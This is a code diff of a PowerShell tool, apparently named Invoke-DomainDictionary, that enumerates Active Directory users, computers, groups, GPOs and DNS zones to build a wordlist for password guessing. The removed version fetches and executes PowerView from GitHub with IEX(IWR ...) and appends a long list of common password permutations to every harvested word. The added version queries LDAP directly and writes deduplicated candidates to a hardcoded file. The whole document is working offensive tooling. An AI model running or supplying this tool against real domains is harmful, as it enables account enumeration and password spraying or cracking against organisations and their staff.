@@ -1,235 +1,99 @@
-Function Invoke-DomainDictionary{
+$File = "C:\Users\srv01_user\Result.txt"
+$Domain = "$env:USERDNSDOMAIN"
 
-param (
-    [string]$Console = "N",
-    [string]$Domain = $env:USERDNSDOMAIN,
-    [string]$Permutate = "N"
-)
-
-Write-Host ""
-Write-Host "[INFO] Loading PowerView into memory" 
-
-IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
-
-
-
-$Path = "$HOME"
-$File = "CustomPasswordListTemp.txt"
-$PermutationsOutput = "$Path\PermutationsOutput.txt"
-$Final = "CustomPasswordListFinal.txt"
-
-$ErrorActionPreference = "Silentlycontinue"
-
-Write-Host "[INFO] Creating Empty file to be populated" 
-
-New-Item -Name $File -Path $Path -ItemType "File" -Force | Out-Null
-Add-Content -Path $Path\$File -Value $null
-
-Function DomainUserProperties{
-Write-Host "[INFO] Gathering Domain User Properties" 
-Get-DomainUser -Properties name -Domain $Domain | Select -ExpandProperty name | Add-Content -Path $Path\$File
-Get-DomainUser -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
-Get-DomainUser -Properties description -Domain $Domain | Select -ExpandProperty description | Add-Content -Path $Path\$File
-Get-DomainUser -Properties givenname -Domain $Domain | Select -ExpandProperty givenname | Add-Content -Path $Path\$File
-Get-DomainUser -Properties mail -Domain $Domain | Select -ExpandProperty mail | Add-Content -Path $Path\$File
-Get-DomainUser -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname | Add-Content -Path $Path\$File
-Get-DomainUser -Properties userprincipalname -Domain $Domain | Select -ExpandProperty userprincipalname | Add-Content -Path $Path\$File
-Get-DomainUser -Properties sn -Domain $Domain | Select -ExpandProperty sn | Add-Content -Path $Path\$File
-Get-DomainUser -Properties physicaldeliveryofficename -Domain $Domain | Select -ExpandProperty physicaldeliveryofficename | Add-Content -Path $Path\$File
-Get-DomainUser -Properties st -Domain $Domain | Select -ExpandProperty st | Add-Content -Path $Path\$File
-Get-DomainUser -Properties postoiffcebox -Domain $Domain | Select -ExpandProperty postofficebox | Add-Content -Path $Path\$File
-Get-DomainUser -Properties l -Domain $Domain | Select -ExpandProperty l | Add-Content -Path $Path\$File
-Get-DomainUser -Properties co -Domain $Domain | Select -ExpandProperty co | Add-Content -Path $Path\$File
-Get-DomainUser -Properties postalcode -Domain $Domain | Select -ExpandProperty postalcode | Add-Content -Path $Path\$File
-Get-DomainUser -Properties serviceprincipalname -Domain $Domain | Select -ExpandProperty serviceprincipalname | Add-Content -Path $Path\$File
-Get-DomainUser -Properties serviceprincipalname  | Select -ExpandProperty serviceprincipalname | ForEach-Object {
-    $_ -replace '^[^/]+/' | Add-Content -Path $Path\$File
-
-}
-
-}
-
-Function DomainComputerProperties{
-Write-Host "[INFO] Gathering Domain Computer Properties" 
-Get-DomainComputer -Properties name -Domain $Domain | Select -ExpandProperty name |Add-Content -Path $Path\$File
-Get-DomainComputer -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
-Get-DomainComputer -Properties description -Domain $Domain | Select -ExpandProperty description  | Add-Content -Path $Path\$File
-Get-DomainComputer -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname | Add-Content -Path $Path\$File
-Get-DomainComputer -Properties dnshostname -Domain $Domain | Select -ExpandProperty dnshostname | Add-Content -Path $Path\$File
-Get-DomainComputer -Properties operatingsystem -Domain $Domain | Select -ExpandProperty operatingsystem |  Add-Content -Path $Path\$File
-
-}
-
-Function DomainControllerProperties{
-Write-Host "[INFO] Gathering Domain Controller Properties" 
-Get-DomainController -Domain $Domain | Select -ExpandProperty OSVersion | Add-Content -Path $Path\$File
-Get-DomainController -Domain $Domain | Select -ExpandProperty Forest | Add-Content -Path $Path\$File
-Get-DomainController -Domain $Domain | Select -ExpandProperty Name | Add-Content -Path $Path\$File
-Get-DomainController -Domain $Domain | Select -ExpandProperty IPAddress | Add-Content -Path $Path\$File
-
-}
-
-Function DomainZoneProperties{
-Write-Host "[INFO] Gathering DNS Zone Properties" 
-Get-DomainDNSZone -Domain $Domain | Select -ExpandProperty ZoneName | Add-Content -Path $Path\$File
-Get-DomainDNSZone -Domain $Domain| Select -ExpandProperty name | Add-Content -Path $Path\$File
-
-}
-
-
-Function DomainGPOProperties{
-Write-Host "[INFO] Gathering Domain GPO Properties" 
-Get-DomainGPO -Properties displayname -Domain $Domain | Select -ExpandProperty displayname |Add-Content -Path $Path\$File
-
-}
-
-
-Function DomainGroupProperties{
-Write-Host "[INFO] Gathering Domain Group Properties" 
-Get-DomainGroup -Properties cn -Domain $Domain | Select -ExpandProperty cn |Add-Content -Path $Path\$File
-Get-DomainGroup -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname |Add-Content -Path $Path\$File
-Get-DomainGroup -Properties description -Domain $Domain | Select -ExpandProperty description |Add-Content -Path $Path\$File
-Get-DomainGroup -Properties name -Domain $Domain | Select -ExpandProperty name |Add-Content -Path $Path\$File
-Get-DomainGroup -Properties mail -Domain $Domain | Select -ExpandProperty mail |Add-Content -Path $Path\$File
-
-}
-
-
-Function DomainOUProperties {
-Write-Host "[INFO] Gathering Domain OU Properties" 
-Get-DomainOU -Properties ou -Domain $Domain  | Select -ExpandProperty ou |Add-Content -Path $Path\$File
-Get-DomainOU -Properties name -Domain $Domain  | Select -ExpandProperty name |Add-Content -Path $Path\$File
-
-    function Remove-DistinguishedName {
-    param (
-        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
-        [string]$DistinguishedName
+Function QueryAndWriteProperties {
+    param(
+        [string]$Domain,
+        [string[]]$Properties,
+        [string]$ObjectClass,
+        [string]$File
     )
-    $DistinguishedName -replace '(OU|CN|DC)=', '' -split ',' | ForEach-Object {
-        $_.Trim()
-    }
-}
 
-Get-DomainOU -Properties distinguishedname | ForEach-Object {
-    Remove-DistinguishedName $_.distinguishedname | ForEach-Object {
-        Add-Content -value $_  -Path $Path\$File
-    }
-}function Remove-DistinguishedName {
-    param (
-        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
-        [string]$DistinguishedName
-    )
-    $DistinguishedName -replace '(OU|CN|DC)=', '' -split ',' | ForEach-Object {
-        $_.Trim()
-    }
-}
-
-Get-DomainOU -Properties distinguishedname | ForEach-Object {
-    Remove-DistinguishedName $_.distinguishedname | ForEach-Object {
-        Add-Content -value $_  -Path $Path\$File
-    }
-}
-
-}
-
-Function MiscProperties {
-Write-Host "[INFO] Gathering Domain Miscellaneous Properties" 
-
-Add-Content -Value $env:USERDNSDOMAIN -Path $Path\$File
-Add-Content -Value $Domain -Path $Path\$File
-
-}
-
-# Execute each function
-
-Write-Host "[INFO] Executing script, this might take a while" 
-DomainOUProperties
-DomainGroupProperties
-DomainGPOProperties
-DomainZoneProperties
-DomainControllerProperties
-DomainComputerProperties
-DomainUserProperties
-MiscProperties
-
-
-
-Get-Content -Path $Path\$File | Sort | Get-Unique > $Path\$Final
-
-
-
-Function Permutate {
-
-$Lines = Get-Content $Path\$Final -Verbose
-
-# Define permutations
-$Permutations = @(
-    "0", "00", "01", "02", "03", "04", "05", "06", "07", "08", "09",
-    "1", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19",
-    "2", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29",
-    "3", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39",
-    "4", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49",
-    "5", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59",
-    "6", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69",
-    "7", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79",
-    "8", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89",
-    "9", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99",
-    "!","!!","!!!", "$", "%", "&", "*", "?", "@", "#", "_",
-    "007", "111111","123","1234", "12345", "123456", "1234567", "12345678", "123456789",
-    "1234567890", "123456abc", "123123", "1q2w3e4r", "1qaz2wsx", "2000", "2001", "2002",
-    "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013",
-    "2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024",
-    "2025", "admin","abc", "abcd1234","asdf1234", "asdfgh", "asdfghjkl",
-    "azure", "college", "letmein", "love", "marvel", "master", "microsoft", "office365",
-    "pass", "passw0rd", "passw0rd!", "password", "password1", "password12", "password123",
-    "passw0rd", "poiuytrewq", "poiuytrewq123", "programmer","q1w2e3r4", "qazwsx",
-    "qazwsxedc", "qazxsw", "qwertasd", "qwertasdfg", "qwe123", "qweasdz", "qweasdzx",
-    "security", "university",""
-)
-
-
-Write-Host "[INFO] Adding Permutations. This will likely take a while" -ForegroundColor "Yellow"
-foreach ($Line in $Lines) {
-    # Split line into words
-    $Words = $Line -split '\s+'
-    
-    foreach ($Word in $Words) {
-        foreach ($Permutation in $Permutations) {
-            $NewLine = "$Word$Permutation"
-            Add-Content $PermutationsOutput $NewLine
-        }
+    Try {
+        $directoryEntry = [ADSI]"LDAP://$Domain"
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
+        $searcher.PageSize = 1000
+        $searcher.Filter = "(objectClass=$ObjectClass)"
+        $searcher.PropertiesToLoad.AddRange($Properties) | Out-Null
         
-        foreach ($Permutation in $Permutations) {
-            $NewLine = "$Permutation$Word"
-            Add-Content $PermutationsOutput $NewLine
-        }
-        
-        foreach ($Permutation in $Permutations) {
-            $NewLine = "$Word$Permutation"
-            if ($Permutation -ne "0") {
-                Add-Content $PermutationsOutput $NewLine
-                }
+        $results = $searcher.FindAll()
+
+        foreach ($result in $results) {
+    $output = $Properties | ForEach-Object {
+        if ($result.Properties[$_].Count -gt 0) {
+            if ($_ -eq 'description') {
+                $result.Properties[$_][0] -split '\s+' 
+            } else {
+                "$($result.Properties[$_][0])" 
             }
         }
     }
- Get-Content -Path "$PermutationsOutput" | Sort | Get-Unique >> "$Path\$Final" -verbose ; Remove-item -Path "$PermutationsOutput" ; Write-Host "[INFO] Removing file $PermutationsOutput"
-
+    Add-Content -Path $File -Value ($output -join "`r`n") -Encoding ASCII
+}
+    }
+    Catch {
+        Write-Host "[ERROR] $($Error[0].Exception.Message)" -ForegroundColor Red
+    }
+    Finally {
+        $searcher.Dispose()
+    }
 }
 
-If ($Permutate -eq "Y"){Permutate}
 
-$OriginalFileCount = (Get-Content -Path $Path\$File).count
-$FinalFileLines = (Get-Content -Path $Path\$Final).count
-Start-Sleep -Seconds 1
-Remove-Item -Path $Path\$File -Force 
-Write-Host ""
-Write-Host "[INFO] Original File Has [$OriginalFileCount] Lines"
-Write-Host "[INFO] Removing Duplicate entries"
-Write-Host "[INFO] Final file has [$FinalFileLines] Lines"
-Write-Host "[INFO] Final file located at $Path\$Final"
-Start-Sleep -Milliseconds 1337
-If ($Console -eq "Y"){Get-Content -Path $Path\$Final ; Remove-Item -Path $Path\$Final; Write-host "" ; Write-Host "[INFO] Removing File $Path\$Final" -ForegroundColor "Yellow"  }
-Write-Host ""
-Write-Host "[INFO] Script Execution Complete" -ForegroundColor "Green"
+Function DomainEntityProperties {
+    param(
+        [string]$Domain,
+        [string]$File,
+        [string]$Entity,
+        [string[]]$Properties
+    )
 
+    Write-Host "[INFO] Gathering Domain $Entity Properties"
+    QueryAndWriteProperties -Domain $Domain -Properties $Properties -ObjectClass $Entity -File $File
 }
+
+# Property Definitions
+$userProperties = @("name", "cn", "description", "givenname", "mail", "samaccountname", "userprincipalname", "sn", 
+                    "physicaldeliveryofficename", "st", "postofficebox", "l", "co", "postalcode", "serviceprincipalname")
+                    
+$computerProperties = @("name", "cn", "description", "samaccountname", "dnshostname", "operatingsystem")
+$groupProperties = @("cn", "samaccountname", "description", "name", "mail")
+$gpoProperties = @("displayname", "distinguishedname")
+$zoneProperties = @("name", "distinguishedname")
+$controllerProperties = @("operatingsystemversion", "distinguishedname", "name", "dnshostname", "site", "location")
+
+Function MiscProperties {
+    param(
+        [string]$Domain,
+        [string]$File
+    )
+
+    Write-Host "[INFO] Gathering Domain Miscellaneous Properties" 
+
+    Add-Content -Value $env:USERDNSDOMAIN -Path $File -Encoding ASCII
+    Add-Content -Value $Domain -Path $File -Encoding ASCII
+}
+
+
+
+# Clear $File if exists
+if (Test-Path -Path $File -PathType Leaf) {
+    Remove-Item -Path $File -Force
+}
+
+
+DomainEntityProperties -Domain $Domain -File $File -Entity "user" -Properties $userProperties
+DomainEntityProperties -Domain $Domain -File $File -Entity "computer" -Properties $computerProperties
+DomainEntityProperties -Domain $Domain -File $File -Entity "group" -Properties $groupProperties
+DomainEntityProperties -Domain $Domain -File $File -Entity "groupPolicyContainer" -Properties $gpoProperties
+DomainEntityProperties -Domain $Domain -File $File -Entity "dnszone" -Properties $zoneProperties
+DomainEntityProperties -Domain $Domain -File $File -Entity "computer" -Properties $controllerProperties
+MiscProperties -Domain $Domain -File $File
+
+Get-Content -Path "$File" | ForEach-Object {
+    $_.ToLower().Trim() -split '[,=]' | ForEach-Object {
+        $_.Trim()
+    }
+} | Where-Object { $_ -ne '' } | Sort-Object | Get-Unique -AsString | Set-Content -Path "$File" -Force
+
+
